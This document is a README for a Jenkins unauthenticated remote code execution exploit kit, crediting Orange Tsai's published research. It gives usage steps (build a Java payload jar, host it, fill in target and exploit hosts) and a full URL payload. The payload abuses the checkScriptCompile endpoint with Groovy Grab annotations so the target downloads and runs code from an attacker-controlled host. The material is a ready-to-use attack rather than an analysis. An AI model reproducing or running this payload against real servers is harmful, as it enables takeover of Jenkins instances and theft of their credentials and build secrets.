JENKINS UNAUTHENTICATED REMOTE CODE EXECUTION
---------------------------------------------

Exploit compiled by me, but full credits for exploit discovery and exploit chaining go to Orange Tsai (orange.tw).

Read his write-ups on this exploit here -
Part 1: https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html
Part 2: http://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html
His github: https://github.com/orangetw


INSTRUCTIONS:
-------------
- Edit code/Payload.java to your specifications, then run build.sh to generate a jar and copy it to the web folder.
- Once that is finished, copy the inner contents of www/ to a webserver.
- In the URL payload, replace <TARGET HOST> with the hostname of the server, and <EXPLOIT HOST> to the hostname of where you uploaded your files.


URL Payload:
------------
http://<TARGET HOST>/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile
?value=
@GrabConfig(disableChecksums=true)%0a
@GrabResolver(name='payload', root='http://<EXPLOIT HOST>')%0a
@Grab(group='package', module='payload', version='1')%0a
import Payload;
